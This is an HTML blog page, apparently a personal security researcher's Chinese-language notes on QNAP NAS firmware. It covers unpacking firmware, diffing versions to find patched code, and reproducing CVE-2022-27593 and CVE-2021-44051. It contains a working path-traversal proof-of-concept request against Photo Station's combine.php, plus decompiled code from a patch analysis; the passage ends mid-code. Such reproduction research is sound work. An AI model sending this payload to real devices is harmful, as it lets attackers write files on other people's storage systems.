@@ -1,0 +1,1002 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Qnap," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Archerの博客" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="Qnap-NAS-Rearcher-note">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Qnap-NAS-Rearcher-note">
+<meta property="og:url" content="http://example.com/2023/03/27/Qnap-Rearcher-note/index.html">
+<meta property="og:site_name" content="Archerの博客">
+<meta property="og:description" content="Qnap-NAS-Rearcher-note">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/2023-03-27140617.png">
+<meta property="og:image" content="http://example.com/images/2023-03-29111601.png">
+<meta property="og:image" content="http://example.com/images/2023-03-29130632.png">
+<meta property="og:image" content="http://example.com/images/2023-03-29133135.png">
+<meta property="og:image" content="http://example.com/images/2023-03-29143049.png">
+<meta property="og:image" content="http://example.com/images/2023-03-29143903.png">
+<meta property="og:image" content="http://example.com/images/2023-03-29151723.png">
+<meta property="og:image" content="http://example.com/images/2023-03-29164707.png">
+<meta property="article:published_time" content="2023-03-27T05:25:30.000Z">
+<meta property="article:modified_time" content="2023-03-30T01:35:20.951Z">
+<meta property="article:author" content="Archer">
+<meta property="article:tag" content="Qnap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/2023-03-27140617.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+
+
+
+
+  <title>Qnap-NAS-Rearcher-note | Archerの博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Archerの博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Welcome</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-about"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-categories"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archives"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/27/Qnap-Rearcher-note/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/1652601666778.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Archerの博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Qnap-NAS-Rearcher-note</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-03-27T13:25:30+08:00">
+                2023-03-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
+                    <span itemprop="name">笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2023/03/27/Qnap-Rearcher-note/" class="leancloud_visitors" data-flag-title="Qnap-NAS-Rearcher-note">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+              <div class="post-description">
+                  Qnap-NAS-Rearcher-note
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>QNAP NAS 是一个网络附加存储解决方案，为个人和商业用户提供集中式的数据存储和管理。QNAP NAS 设备通常带有多个硬盘托架，可以用各种硬盘或固态硬盘组合进行填充，旨在成为一个全方位的文件共享、媒体流、数据备份和应用程序安装解决方案。</p>
+<p>除了基本的文件共享和数据备份功能外，QNAP NAS 设备提供各种特性和功能，以满足不同的需求和喜好。这些包括能够托管虚拟机、运行 Docker 容器、作为监视系统，并同时流式传输媒体到多个设备。</p>
+<p>此外，QNAP NAS 设备配备其自己的操作系统，名为 QTS（QNAPTurbo NAS系统），该系统具有用户友好的界面和可从 QNAP应用程序中心下载的广泛应用程序。这些应用程序涵盖从多媒体应用程序（如 Plex 和 Kodi）到生产力工具（如 Microsoft Office和Google Drive集成），甚至高性能应用程序（如虚拟化站和容器站）等各种类型。</p>
+<p>总的来说，QNAP NAS 提供了一个强大而灵活的数据集中和管理解决方案，因此在个人和商业使用中广受欢迎。</p>
+<h2 id="固件、插件获取与解包"><a href="#固件、插件获取与解包" class="headerlink" title="固件、插件获取与解包"></a>固件、插件获取与解包</h2><p>官网上可以下载新版本的链接，需要选择设备型号、硬盘数、类型<br><a target="_blank" rel="noopener" href="https://www.qnap.com/en/download">新版本链接</a><br><a target="_blank" rel="noopener" href="https://www.qnap.com/en/release-notes/qts/overview/5.0.1">QTS更新以及适配信息</a><br>第三方Qnap固件下载地址<br>1.<a target="_blank" rel="noopener" href="https://drivers.plus/it/">https://drivers.plus/it/</a><br>插件下载：<br>App Center -&gt; 获取下载链接 -&gt;获取Release note -&gt; 复制下载链接 -&gt; 修改下载链接中的时间和版本号为对应Release note用于下载历史版本<br>插件解包：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me 插件</span><br></pre></td></tr></table></figure>
+<p>固件解包：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#方法一，使用Qnap自带的解压程序解压</span></span><br><span class="line">/sbin/PC1 d QNAPNASVERSION4 <span class="string">&quot;<span class="variable">$path_name</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;_tgz&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;CS_SIGNATURE&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">#方法二，使用脚本解压，链接：https://github.com/max-boehm/qnap-utils</span></span><br><span class="line">./extract_qnap_fw.sh firmware.img destdir</span><br></pre></td></tr></table></figure>
+<p>然后对得到的文件解压(0.gz)，得到一个目录，如图<br><img src="/images/2023-03-27140617.png" alt="avatar"><br>进入目录使用ubi_reader对uboot.ubi进行解压就能成功得到整个文件系统，后续对需要的文件系统解压即可(QuTScloud中为rootfs2.bz可以直接解压)<br>ubi_reader安装使用</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/jrspruitt/ubi_reader</span><br><span class="line"><span class="built_in">cd</span> ubi_reader</span><br><span class="line">sudo python setup.py install</span><br><span class="line">ubireader_extract_files rootfs2.ubi</span><br></pre></td></tr></table></figure>
+<p>cgi目录：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(固件名).img.tgz.extracted/_0.extracted/ubifs-root/646022806/rootfs2/boot/rootfs2/home/httpd/cgi-bin</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>复现Qnap的漏洞时，若有存在漏洞版本而找不到相邻版本时，可以先根据QuTSCloud等的存在漏洞的相邻版本来判断，目前官方可以下载到c4.5.1.1350 - c5.0.1.2148 build 20220905之间的所有版本，通过安装QuTScloud的方式复现漏洞也不失为一种好方法，一年300r。<br>Qnap的许多漏洞的描述信息为了保证用户的安全一般都不会公开漏洞复现所需的关键信息，这时，需要自己进行代码审计来定位到漏洞点<br>思路：<br>    1.对比两个版本中的文件的md5<br>    2.筛选相关文件<br>    3.对筛选出来的文件进行diff<br>用于对比两个版本文件夹下文件的脚本，如下</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不用比较的文件类型列表，多个用竖杠隔开</span></span><br><span class="line">FILTER_TYPE=<span class="string">&quot;\.(html|css|png|txt|py|pyc|php|js|gif|script|svg|vmsg|swf|ttf|ico|jpeg|conf|json|sign|cksum|boot|tar|bz|tgz)$&quot;</span></span><br><span class="line"><span class="comment"># 获取1919目录下的所有文件路径</span></span><br><span class="line">FILENAMES_1919=$(find ./1919 -<span class="built_in">type</span> f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 start 和 end 文件夹</span></span><br><span class="line"><span class="keyword">if</span> [[ ! -d <span class="string">&quot;./start&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  mkdir <span class="string">&quot;./start&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ ! -d <span class="string">&quot;./end&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  mkdir <span class="string">&quot;./end&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置进度条相关的变量</span></span><br><span class="line">COUNT=1</span><br><span class="line">TOTAL=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;FILENAMES_1919&#125;</span>&quot;</span> | wc -l)</span><br><span class="line">BAR=<span class="string">&#x27;##########&#x27;</span></span><br><span class="line">BAR_LEN=<span class="variable">$&#123;#BAR&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> <span class="variable">$&#123;FILENAMES_1919&#125;</span>; <span class="keyword">do</span></span><br><span class="line">  <span class="comment"># 判断文件是否不需要比较</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;f&#125;</span>&quot;</span> =~ <span class="variable">$FILTER_TYPE</span> || <span class="string">&quot;<span class="variable">$&#123;f&#125;</span>&quot;</span> =~ <span class="string">&quot;.bz.sign$&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">continue</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 获取文件在1949目录的路径</span></span><br><span class="line">  FILE_PATH_1949=$(<span class="built_in">echo</span> <span class="variable">$&#123;f&#125;</span> | sed <span class="string">&#x27;s#/1919/#/1949/#g&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 判断1949目录是否有同名文件，如果有则比较md5值</span></span><br><span class="line">  <span class="keyword">if</span> [[ -f <span class="variable">$&#123;FILE_PATH_1949&#125;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    MD5_1919=$(md5sum <span class="variable">$&#123;f&#125;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    MD5_1949=$(md5sum <span class="variable">$&#123;FILE_PATH_1949&#125;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;MD5_1919&#125;</span>&quot;</span> != <span class="string">&quot;<span class="variable">$&#123;MD5_1949&#125;</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">      <span class="comment"># 文件被修改了，将被修改前的文件复制到 start 文件夹中</span></span><br><span class="line">      cp <span class="string">&quot;<span class="variable">$&#123;f&#125;</span>&quot;</span> <span class="string">&quot;./start/<span class="subst">$(basename $&#123;f&#125;)</span>&quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># 将被修改后的文件复制到 end 文件夹中</span></span><br><span class="line">      cp <span class="string">&quot;<span class="variable">$&#123;FILE_PATH_1949&#125;</span>&quot;</span> <span class="string">&quot;./end/<span class="subst">$(basename $&#123;FILE_PATH_1949&#125;)</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="comment"># 对start目录中的文件进行分类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> ./start/*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [[ -f <span class="variable">$file</span> ]]; <span class="keyword">then</span></span><br><span class="line">        extension=<span class="string">&quot;<span class="variable">$&#123;file##*.&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$extension</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">            <span class="string">&quot;cgi&quot;</span>)</span><br><span class="line">                mkdir -p ./start/cgi/</span><br><span class="line">                mv <span class="string">&quot;<span class="variable">$file</span>&quot;</span> ./start/cgi/</span><br><span class="line">                ;;</span><br><span class="line">            <span class="string">&quot;so&quot;</span>)</span><br><span class="line">                mkdir -p ./start/so/</span><br><span class="line">                mv <span class="string">&quot;<span class="variable">$file</span>&quot;</span> ./start/so/</span><br><span class="line">                ;;</span><br><span class="line">            <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                mkdir -p ./start/0/</span><br><span class="line">                mv <span class="string">&quot;<span class="variable">$file</span>&quot;</span> ./start/0/</span><br><span class="line">                ;;</span><br><span class="line">            <span class="string">&quot;1&quot;</span>)</span><br><span class="line">                mkdir -p ./start/1/</span><br><span class="line">                mv <span class="string">&quot;<span class="variable">$file</span>&quot;</span> ./start/1/</span><br><span class="line">                ;;</span><br><span class="line">            <span class="string">&quot;2&quot;</span>)</span><br><span class="line">                mkdir -p ./start/2/</span><br><span class="line">                mv <span class="string">&quot;<span class="variable">$file</span>&quot;</span> ./start/2/</span><br><span class="line">                ;;</span><br><span class="line">            *)</span><br><span class="line">                mkdir -p ./start/others/</span><br><span class="line">                mv <span class="string">&quot;<span class="variable">$file</span>&quot;</span> ./start/others/</span><br><span class="line">                ;;</span><br><span class="line">        <span class="keyword">esac</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对end目录中的文件进行分类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> ./end/*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [[ -f <span class="variable">$file</span> ]]; <span class="keyword">then</span></span><br><span class="line">        extension=<span class="string">&quot;<span class="variable">$&#123;file##*.&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$extension</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">            <span class="string">&quot;cgi&quot;</span>)</span><br><span class="line">                mkdir -p ./end/cgi/</span><br><span class="line">                mv <span class="string">&quot;<span class="variable">$file</span>&quot;</span> ./end/cgi/</span><br><span class="line">                ;;</span><br><span class="line">            <span class="string">&quot;so&quot;</span>)</span><br><span class="line">                mkdir -p ./end/so/</span><br><span class="line">                mv <span class="string">&quot;<span class="variable">$file</span>&quot;</span> ./start/so/</span><br><span class="line">                ;;</span><br><span class="line">            <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                mkdir -p ./end/0/</span><br><span class="line">                mv <span class="string">&quot;<span class="variable">$file</span>&quot;</span> ./end/0/</span><br><span class="line">                ;;</span><br><span class="line">            <span class="string">&quot;1&quot;</span>)</span><br><span class="line">                mkdir -p ./end/1/</span><br><span class="line">                mv <span class="string">&quot;<span class="variable">$file</span>&quot;</span> ./end/1/</span><br><span class="line">                ;;</span><br><span class="line">            <span class="string">&quot;2&quot;</span>)</span><br><span class="line">                mkdir -p ./end/2/</span><br><span class="line">                mv <span class="string">&quot;<span class="variable">$file</span>&quot;</span> ./end/2/</span><br><span class="line">                ;;</span><br><span class="line">            *)</span><br><span class="line">                mkdir -p ./end/others/</span><br><span class="line">                mv <span class="string">&quot;<span class="variable">$file</span>&quot;</span> ./end/others/</span><br><span class="line">                ;;</span><br><span class="line">        <span class="keyword">esac</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Done&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="CVE-2022-27593"><a href="#CVE-2022-27593" class="headerlink" title="CVE-2022-27593"></a>CVE-2022-27593</h3><p>漏洞信息：<br>据报告，影响QNAP NAS运行Photo Station的外部控制参考资源漏洞已被报告。如果利用此漏洞，攻击者可以修改系统文件。我们已经在以下版本中修复了漏洞：QTS 5.0.1：Photo Station 6.1.2及更高版本；QTS 5.0.0/4.5.x：Photo Station 6.0.22及更高版本；QTS 4.3.6：Photo Station 5.7.18及更高版本；QTS 4.3.3：Photo Station 5.4.15及更高版本；QTS 4.2.6：Photo Station 5.2.14及更高版本。<br>poc</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://xxx.xxx.xxx.xxx:8080/photo/combine.php&quot;</span></span><br><span class="line">params = &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;css&quot;</span>, <span class="string">&quot;g&quot;</span>: <span class="string">&quot;main-/../../../../../../a.php................&quot;</span>&#125;</span><br><span class="line">response = requests.get(url, params=params)</span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br></pre></td></tr></table></figure>
+<p>任意地址写文件，文件名可以为任意值，但无法控制文件类容，若想实现进一步利用，一般来说需要找到能将文件名执行的代码，或者历史漏洞等</p>
+<h3 id="CVE-2021-44052"><a href="#CVE-2021-44052" class="headerlink" title="CVE-2021-44052"></a>CVE-2021-44052</h3><p>漏洞信息：<br>已经报告了一个影响运行QuTScloud、QuTS hero和QTS的QNAP设备的“链接跟踪”漏洞。如果利用，这个漏洞允许远程攻击者遍历文件系统到意外的位置并读取或覆盖意外的文件内容。我们已经在以下版本的QuTScloud、QuTS hero和QTS中修复了这个漏洞：QuTScloud c5.0.1.1998及更高版本、QuTS hero h4.5.4.1971 build 20220310及更高版本、QuTS hero h5.0.0.1986 build 20220324及更高版本、QTS 4.3.4.1976 build 20220303及更高版本、QTS 4.3.3.1945 build 20220303及更高版本、QTS 4.2.6 build 20220304及更高版本、QTS 4.3.6.1965 build 20220302及更高版本、QTS 5.0.0.1986 build 20220324及更高版本、QTS 4.5.4.1991 build 20220329及更高版本。<br>有点难审todo</p>
+<h3 id="CVE-2021-44051"><a href="#CVE-2021-44051" class="headerlink" title="CVE-2021-44051"></a>CVE-2021-44051</h3><p>漏洞信息：命令注入，影响版本QuTScloud c5.0.1.1949…修复版本QuTScloud c5.0.1.1998…</p>
+<h4 id="authLogin-cgi"><a href="#authLogin-cgi" class="headerlink" title="authLogin.cgi"></a>authLogin.cgi</h4><p>5个函数有区别<br><img src="/images/2023-03-29111601.png" alt="avatar"><br>408FE0没有逻辑上的区别<br>sub_41D2F0和sub_41D6B0区别如下<br><img src="/images/2023-03-29130632.png" alt="avatar"><br>这里感觉不会是注入的点，跳过<br>sub_40cc70和sub40CE30区别如图<br><img src="/images/2023-03-29133135.png" alt="avatar"><br>这里调整了代码执行的顺序，并且为函数增加了一个参数用于判断是否执行如下(为1时执行)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v31) = <span class="number">4319297</span>;</span><br><span class="line">    <span class="keyword">if</span> ( haystack[<span class="number">0</span>] )</span><br><span class="line">      v31 = haystack;</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;HTTPHost&quot;</span>, <span class="number">0</span>, <span class="number">4319261</span>, (_DWORD)v31, v7, v8);</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;QWebPort&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, Qweb_Port, v32, v33);</span><br><span class="line">    v34 = Is_Webfs_Enabled();</span><br><span class="line">    Profile_Boolean = Get_Profile_Boolean(<span class="string">&quot;Index&quot;</span>, <span class="string">&quot;Webfs_LOGO&quot;</span>, <span class="number">1LL</span>);</span><br><span class="line">    sub_410850((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;webFSEnabled&quot;</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, (v34 &amp; Profile_Boolean) != <span class="number">0</span>, v36, v37);</span><br><span class="line">    <span 